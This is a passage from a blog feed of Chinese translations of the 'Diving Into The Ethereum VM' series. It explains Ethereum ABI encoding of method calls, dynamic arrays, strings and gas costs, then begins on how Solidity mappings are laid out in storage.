punctuation">)</span>, 0xffffffff<span class="token punctuation">)</span>// <span class="token keyword">if</span> methodSelector <span class="token operator">==</span> 0x9cdcf9b0x9cdcf9bdup2eqtag_2 // SetBjumpi// elsif methodSelector <span class="token operator">==</span> 0xee919d50dup10xee919d50eqtag_3 // SetAjumpi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在伪代码中：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">methodSelector <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">0</span>:4<span class="token punctuation">]</span><span class="token keyword">if</span> methodSelector <span class="token operator">==</span> <span class="token string">"0x9cdcf9b"</span><span class="token builtin class-name">:</span>  goto tag_2elsif methodSelector <span class="token operator">==</span> <span class="token string">"0xee919d50"</span><span class="token builtin class-name">:</span>  goto tag_3else:  // Cannot <span class="token function">find</span> a matching method. Fail.  revert<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="ABI-Encoding-For-Complex-Method-Calls"><a href="#ABI-Encoding-For-Complex-Method-Calls" class="headerlink" title="ABI Encoding For Complex Method Calls"></a>ABI Encoding For Complex Method Calls</h2><p>对于方法调用，交易输入数据的前四个字节始终是方法选择器。然后方法参数以 32 字节为单位跟在后面。 <a href="https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI">ABI 编码规范</a> 详细说明了如何对更复杂类型的参数进行编码，但阅读起来可能会非常痛苦。</p><p>学习 ABI 编码的另一个策略是使用 <a href="https://github.com/ethereum/pyethereum/blob/4e945e2a24554ec04eccb160cff689a82eed7e0d/ethereum/abi.py">pyethereum 的 ABI 编码函数</a> 来研究不同类型的数据是如何编码的。我们将从简单的案例开始，然后构建更复杂的类型。</p><p>首先，导入 <code>encode_abi</code>​ 函数：</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ethereum<span class="token punctuation">.</span>abi <span class="token keyword">import</span> encode_abi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>对于具有三个 uint256 参数的方法（例如 <code>foo(uint256 a, uint256 b, uint256 c)</code>​），编码参数只是一个接一个的 uint256 数字：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># The first array lists the types of the arguments.</span><span class="token comment"># The second array lists the argument values.</span><span class="token operator">></span> encode_abi<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"uint256"</span>, <span class="token string">"uint256"</span>, <span class="token string">"uint256"</span><span class="token punctuation">]</span>,<span class="token punctuation">[</span><span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>小于 32 字节的类型被填充到 32 字节：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"int8"</span>, <span class="token string">"uint32"</span>, <span class="token string">"uint64"</span><span class="token punctuation">]</span>,<span class="token punctuation">[</span><span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>对于固定大小的数组，元素也是 32 字节的块（必要时填充零），一个接一个地放置：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>   <span class="token punctuation">[</span><span class="token string">"int8[3]"</span>, <span class="token string">"int256[3]"</span><span class="token punctuation">]</span>,   <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">4</span>, <span class="token number">5</span>, <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>// int8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>. Zero-padded to <span class="token number">32</span> bytes.000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003// int256<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>.000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="ABI-Encoding-for-Dynamic-Arrays"><a href="#ABI-Encoding-for-Dynamic-Arrays" class="headerlink" title="ABI Encoding for Dynamic Arrays"></a>ABI Encoding for Dynamic Arrays</h2><p>ABI 引入了一个间接层(layer of indirection)来编码动态数组，遵循称为 <a href="https://github.com/ethereum/pyethereum/blob/4e945e2a24554ec04eccb160cff689a82eed7e0d/ethereum/abi.py#L735-L741">头尾编码(head-tail encoding)</a> 的方案。</p><p>这个思想是动态数组的元素被打包在交易 calldata 的尾部。参数（“head”）是对数组元素所在的 calldata 的引用。</p><p>如果我们调用具有 3 个动态数组的方法，则参数编码如下（为清楚起见添加了注释和换行符）：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"uint256[]"</span>, <span class="token string">"uint256[]"</span>, <span class="token string">"uint256[]"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span><span class="token punctuation">[</span>0xa1, 0xa2, 0xa3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0xb1, 0xb2, 0xb3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0xc1, 0xc2, 0xc3<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>/************* HEAD <span class="token punctuation">(</span><span class="token number">32</span>*3 bytes<span class="token punctuation">)</span> *************/// arg1: <span class="token function">look</span> at position 0x60 <span class="token keyword">for</span> array data0000000000000000000000000000000000000000000000000000000000000060// arg2: <span class="token function">look</span> at position 0xe0 <span class="token keyword">for</span> array data00000000000000000000000000000000000000000000000000000000000000e0// arg3: <span class="token function">look</span> at position 0x160 <span class="token keyword">for</span> array data0000000000000000000000000000000000000000000000000000000000000160/************* TAIL <span class="token punctuation">(</span><span class="token number">128</span>**3 bytes<span class="token punctuation">)</span> *************/// position 0x60. Data <span class="token keyword">for</span> arg1.// Length followed by elements.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000a100000000000000000000000000000000000000000000000000000000000000a200000000000000000000000000000000000000000000000000000000000000a3// position 0xe0. Data <span class="token keyword">for</span> arg2.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3// position 0x160. Data <span class="token keyword">for</span> arg3.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000c100000000000000000000000000000000000000000000000000000000000000c200000000000000000000000000000000000000000000000000000000000000c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>所以 <code>head</code>​ 有三个 32 字节的参数，指向尾部的位置，尾部包含三个动态数组的实际数据。</p><p>例如，第一个参数是 <code>0x60</code>​，指向 calldata 的第 96（<code>0x60</code>​）个字节。如果查看第 96 个字节，它是数组的开头。前 32 个字节是长度，后跟三个元素。</p><p>可以混合使用动态和静态参数。这是一个带有（<code>static</code>​、<code>dynamic</code>​、<code>static</code>​）参数的示例。静态参数按原样编码，而第二个动态数组的数据放在尾部：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"uint256"</span>, <span class="token string">"uint256[]"</span>, <span class="token string">"uint256"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span>0xaaaa, <span class="token punctuation">[</span>0xb1, 0xb2, 0xb3<span class="token punctuation">]</span>, 0xbbbb<span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>/************* HEAD <span class="token punctuation">(</span><span class="token number">32</span>*3 bytes<span class="token punctuation">)</span> *************/// arg1: 0xaaaa000000000000000000000000000000000000000000000000000000000000aaaa// arg2: <span class="token function">look</span> at position 0x60 <span class="token keyword">for</span> array data0000000000000000000000000000000000000000000000000000000000000060// arg3: 0xbbbb000000000000000000000000000000000000000000000000000000000000bbbb/************* TAIL <span class="token punctuation">(</span><span class="token number">128</span> bytes<span class="token punctuation">)</span> *************/// position 0x60. Data <span class="token keyword">for</span> arg2.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>有很多零，但没关系。</p><h2 id="Encoding-Bytes"><a href="#Encoding-Bytes" class="headerlink" title="Encoding Bytes"></a>Encoding Bytes</h2><p>字符串和字节数组也是头尾编码的。唯一的区别是字节被紧密地打包成 32 个字节的块，如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"string"</span>, <span class="token string">"string"</span>, <span class="token string">"string"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span><span class="token string">"aaaa"</span>, <span class="token string">"bbbb"</span>, <span class="token string">"cccc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>// arg1: <span class="token function">look</span> at position 0x60 <span class="token keyword">for</span> string data0000000000000000000000000000000000000000000000000000000000000060// arg2: <span class="token function">look</span> at position 0xa0 <span class="token keyword">for</span> string data00000000000000000000000000000000000000000000000000000000000000a0// arg3: <span class="token function">look</span> at position 0xe0 <span class="token keyword">for</span> string data00000000000000000000000000000000000000000000000000000000000000e0// 0x60 <span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">)</span>. Data <span class="token keyword">for</span> arg10000000000000000000000000000000000000000000000000000000000000004<span class="token number">6161616100000000000000000000000000000000000000000000000000000000</span>// 0xa0 <span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">)</span>. Data <span class="token keyword">for</span> arg20000000000000000000000000000000000000000000000000000000000000004<span class="token number">6262626200000000000000000000000000000000000000000000000000000000</span>// 0xe0 <span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span>. Data <span class="token keyword">for</span> arg30000000000000000000000000000000000000000000000000000000000000004<span class="token number">6363636300000000000000000000000000000000000000000000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>对于每个字符串&#x2F;字节数组，前 32 个字节编码了长度，紧跟着是字节。</p><p>如果字符串大于 32 字节，则使用多个 32 字节块：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// encode <span class="token number">48</span> bytes of string dataethereum.abi.encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"string"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span><span class="token string">"a"</span> * <span class="token punctuation">(</span><span class="token number">32</span>+16<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>0000000000000000000000000000000000000000000000000000000000000020// length of string is 0x30 <span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>0000000000000000000000000000000000000000000000000000000000000030<span class="token number">6161616161616161616161616161616161616161616161616161616161616161</span><span class="token number">6161616161616161616161616161616100000000000000000000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Nested-Arrays"><a href="#Nested-Arrays" class="headerlink" title="Nested Arrays"></a>Nested Arrays</h2><p>嵌套数组的每个嵌套都有一个间接寻址。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> encode_abi<span class="token punctuation">(</span>  <span class="token punctuation">[</span><span class="token string">"uint256[][]"</span><span class="token punctuation">]</span>,  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>0xa1, 0xa2, 0xa3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0xb1, 0xb2, 0xb3<span class="token punctuation">]</span>, <span class="token punctuation">[</span>0xc1, 0xc2, 0xc3<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>// arg1: The outter array is at position 0x20.0000000000000000000000000000000000000000000000000000000000000020// 0x20. Each element is the position of an inner array.0000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000160// array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> at 0x60000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000a100000000000000000000000000000000000000000000000000000000000000a200000000000000000000000000000000000000000000000000000000000000a3// array<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> at 0xe0000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3// array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> at 0x160000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000c100000000000000000000000000000000000000000000000000000000000000c200000000000000000000000000000000000000000000000000000000000000c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>是的，有很多零。</p><h2 id="Gas-Cost-amp-ABI-Encoding-Design"><a href="#Gas-Cost-amp-ABI-Encoding-Design" class="headerlink" title="Gas Cost &amp; ABI Encoding Design"></a>Gas Cost &amp; ABI Encoding Design</h2><p>为什么 ABI 将方法选择器截断为仅 4 个字节？如果我们不使用 sha256 的全部 32 个字节，不同的方法是否会发生不幸的冲突？如果截断是为了节省成本，那么如果使用零填充浪费了更多字节，为什么还要在方法选择器中节省 28 个字节呢？</p><p>这两种设计选择似乎是矛盾的……直到我们考虑交易的 gas 费用。</p><ul><li>每笔交易支付 21000。</li><li>交易的每个零字节数据或代码需要支付 4。</li><li>交易的每个非零字节数据或代码需要支付 68。</li></ul><p>零值便宜 17 倍，因此零填充并不像看起来那么糟糕。</p><p>方法选择器是一个加密哈希，它是伪随机的。随机字符串往往具有大部分非零字节，因为每个字节只有 0.3% (1&#x2F;255) 的机会为 0。</p><ul><li><code>0x1</code>​ 填充到 32 字节需要 192 gas。（4 * 31 + 68）</li><li>sha256 可能有 32 个非零字节，这大约需要 2176 gas。（32 * 68）</li><li>sha256 被截断为 4 个字节将花费大约 272 gas。（32 * 4）</li></ul><p>ABI 展示了另一个受 gas 费用结构激励的古怪低级设计示例。</p><h2 id="Negative-Integers…"><a href="#Negative-Integers…" class="headerlink" title="Negative Integers…"></a>Negative Integers…</h2><p>负整数通常使用称为<a href="https://en.wikipedia.org/wiki/Two%27s_complement">二进制补码</a>的方案表示。 int8 编码类型的值 <code>-1</code>​ 将全部为 1 <code>1111 1111</code>​。</p><p>ABI 用 1 填充负整数，因此 <code>-1</code>​ 将被填充为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>小的负数大部分是 1，这会花费你很多 gas。</p><p>¯_(ツ)_&#x2F;¯</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>要与智能合约交互，您需要向其发送原始字节。它会进行一些计算，可能会改变自己的状态，然后向您发送原始字节作为返回。方法调用实际上并不存在。这是 ABI 创造的集体幻觉(collective illusion)。</p><p>ABI 被指定为低级格式，但在功能上它更像是跨语言 RPC 框架的序列化格式。</p><p>我们可以在 DApp 和 Web App 的架构层之间进行类比：</p><ul><li>区块链就像背后的数据库。</li><li>合约就像一个网络服务。</li><li>交易就像一个请求。</li><li>ABI 是数据交换格式，类似于<a href="https://en.wikipedia.org/wiki/Protocol_Buffers">协议缓冲区</a>。</li></ul><h2 id="Other-Parts"><a href="#Other-Parts" class="headerlink" title="Other Parts"></a>Other Parts</h2><p>在这一系列文章中，我翻译了 <a href="https://medium.com/@hayeah">Howard</a> 的 <a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum VM</a> 系列文章。译文链接如下：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/">深入以太坊虚拟机 Part6 — Solidity 事件实现</a><br>也可以直接看总结篇：</li><li><a href="http://alphafitz.com/2022/10/17/diving-into-the-ethereum-vm-summary">深入以太坊虚拟机 总结</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入以太坊虚拟机-Part4-—-智能合约外部方法调用&quot;&gt;&lt;a href=&quot;#深入以太坊虚拟机-Part4-—-智能合约外部方法调用&quot; class=&quot;headerlink&quot; title=&quot;深入以太坊虚拟机 Part4 — 智能合约外部方法调用&quot;&gt;&lt;/a&gt;深入以太坊</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊虚拟机" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深入以太坊虚拟机 Part3 — 动态数据类型的表示</title>
    <link href="https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/"/>
    <id>https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/</id>
    <published>2022-10-07T08:39:43.000Z</published>
    <updated>2022-10-17T04:06:08.524Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入以太坊虚拟机-Part3-—-动态数据类型的表示"><a href="#深入以太坊虚拟机-Part3-—-动态数据类型的表示" class="headerlink" title="深入以太坊虚拟机 Part3 — 动态数据类型的表示"></a>深入以太坊虚拟机 Part3 — 动态数据类型的表示</h1><blockquote><p>原文：<a href="https://medium.com/@hayeah/diving-into-the-ethereum-vm-the-hidden-costs-of-arrays-28e119f04a9b">Diving Into The Ethereum VM Part 3 — The Hidden Costs of Arrays | by Howard | Aug 24, 2017</a></p></blockquote><p>Solidity 提供了其他编程语言中常见的数据结构。除了像数字和结构体这样的简单值之外，还有一些数据类型可以随着更多数据的添加而动态扩展。这些动态类型的三个主要类别是：</p><ul><li>映射：<code>mapping(bytes32 =&gt; uint256)</code>，<code>mapping(address =&gt; string)</code>，等等</li><li>数组：<code>[]uint256</code>，<code>[]byte</code>，等等</li><li>字节数组，只有两种：<code>string</code>，<code>bytes</code>。</li></ul><p>在本系列的上一部分中，我们看到了具有固定大小的简单类型如何在存储中表示。</p><ul><li>基本值：<code>uint256</code>，<code>byte</code>，等等</li><li>固定大小的数组：<code>[10]uint8</code>，<code>[32]byte</code>，<code>bytes32</code>​</li><li>结合上面类型的结构体</li></ul><p>具有固定大小的存储变量在存储中一个接一个地放置，尽可能紧密地打包成 32 字节的块。</p><p>（如果这部分看起来不熟悉，请阅读 <a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a>）</p><p>在本文中，我们将研究 Solidity 如何支持更复杂的数据结构。 Solidity 中的数组和映射可能表面上看起来很熟悉，但它们的实现方式赋予了它们完全不同的性能特征。</p><p>我们将从映射开始，这是三者中最简单的。事实证明，数组和字节数组只是具有更高级特性的映射。<br /></p><h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><p>让我们在 <code>uint256 =&gt; uint256</code> 映射中存储一个值：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-mapping.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> items<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>items<span class="token punctuation">[</span><span class="token number">0xC0FEFE</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x42</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>编译：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">solc --bin --asm --optimize c-mapping.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  // Doesn't <span class="token keyword">do</span> anything. Should be optimized away.  0xc0fefe  0x0  swap1  dup2  mstore  0x20  mstore  // Storing 0x42 to the address 0x798<span class="token punctuation">..</span>.187c  0x42  0x79826054ee948a209ff4a6c9064d7398508d2c1909a392f899d301c6d232187c  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>我们可以将 EVM 存储视为一个键值(key-value)数据库，每个键限制为存储 32 个字节。这里没有直接使用键 <code>0xC0FEFE</code>，而是将键散列为 <code>0x798...187c</code>，并将值 <code>0x42</code> 存储在那里。使用的散列函数是 <code>keccak256</code> (SHA256) 函数。</p><p>在这个例子中，我们看不到 <code>keccak256</code> 指令本身，因为优化器决定预先计算结果并将其内联到字节码中。我们仍然可以看到这种计算的痕迹，形式是无用的 <code>mstore</code> 指令。</p><h2 id="Calculate-The-Address"><a href="#Calculate-The-Address" class="headerlink" title="Calculate The Address"></a>Calculate The Address</h2><p>让我们使用一些 Python 代码将 <code>0xC0FEFE</code> 哈希为 <code>0x798...187c</code>。如果您想继续学习，则需要 Python 3.6，或安装 <a href="https://pypi.python.org/pypi/pysha3">pysha3</a> 以获取 <code>keccak_256</code> 哈希函数。</p><p>定义两个辅助函数：</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> sha3<span class="token comment"># Convert a number to 32 bytes array.</span><span class="token keyword">def</span> <span class="token function">bytes32</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">'%064x'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span><span class="token comment"># Calculate the keccak256 hash of a 32 bytes array.</span><span class="token keyword">def</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> sha3<span class="token punctuation">.</span>keccak_256<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>将数字转换为 32 个字节：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> bytes32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>b<span class="token string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'</span><span class="token operator">>></span><span class="token operator">></span> bytes32<span class="token punctuation">(</span>0xC0FEFE<span class="token punctuation">)</span>b<span class="token string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xfe\xfe'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>要将两个字节数组连接在一起，可使用 <code>+</code> 运算符：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> bytes32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> + bytes32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>b<span class="token string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>计算字节的 keccak256 哈希：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> keccak256<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span><span class="token string">'bc36789e7a1e281436464229828f817d6612f7b477d66591ff96a9e064bcc98a'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>现在我们可以计算 <code>0x798...187c</code>。</p><p>存储变量 <code>items</code> 的位置是 <code>0x0</code>（因为它是第一个存储变量）。要获取地址，将键 <code>0xc0fefe</code> 与 <code>items</code> 的位置连接：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># key = 0xC0FEFE, position = 0</span><span class="token 